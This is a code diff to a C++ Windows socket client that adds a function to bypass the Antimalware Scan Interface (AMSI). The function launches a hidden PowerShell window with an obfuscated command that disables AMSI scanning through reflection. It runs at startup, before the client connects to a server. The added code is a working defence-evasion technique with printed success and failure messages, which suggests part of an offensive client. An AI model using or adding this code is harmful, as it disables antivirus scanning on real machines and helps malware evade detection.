@@ -1,6 +1,7 @@
 #include <iostream>
-#include <winsock2.h> // Core Sockets (Windows)
+#include <winsock2.h> // Core Sockets
 #include <windows.h>
+#include <cstdint> // For AMSI Bypass
 
 #define DEFAULT_CLIENT_IP "127.0.0.1"
 #define DEFAULT_SERVER_IP "127.0.0.1"
@@ -11,6 +12,24 @@ struct SocketInfo {
     SOCKET windowsClientSocket;
     sockaddr_in serverAddress;
 };
+
+void bypass_AMSI() {
+    HINSTANCE result = ShellExecute(
+        NULL, 
+        "open", 
+        "powershell", 
+        "-ExecutionPolicy Bypass -NoProfile -Command \"[ReF].\"`A$(echo sse)`mB$(echo L)`Y\".g`E$(echo tty)p`E\"(( \"Sy{3}ana{1}ut{4}ti{2}{0}ils\" -f'iUt','gement.A',\"on.Am`s\",\"stem.M\",\"oma\") ).\"$(echo ge)`Tf`i$(echo El)D\"((\"{0}{2}ni{1}iled\" -f'am','tFa',\"`siI\"),(\"{2}ubl{0}`,{1}{0}\" -f 'ic','Stat','NonP')).\"$(echo Se)t`Va$(echo LUE)\"($(),$(1 -eq 1))\"",
+        NULL, 
+        SW_HIDE);  // SW_HIDE to hide the PowerShell window
+
+    if (reinterpret_cast<uintptr_t>(result) <= 32) {
+        // ShellExecute failed
+        std::cerr << "AMSI Bypass has Failed with Error: " << reinterpret_cast<uintptr_t>(result) << std::endl;
+    } else {
+        // ShellExecute succeeded
+        std::cout << "AMSI Bypass Successful!" << std::endl;
+    }
+}
 
 SocketInfo createSocketWindows() {
     WSADATA winSockData; // Initializes Winsock
@@ -73,6 +92,9 @@ int main(int argc, char* argv[]) {
 
     std::cout << "Client IP: " << clientIP << std::endl;
     std::cout << "Port: " << port << std::endl;
+
+    // Bypass AMSI
+    bypass_AMSI();
 
     SocketInfo socketInfo;
     std::cout << "Running on Windows" << std::endl;
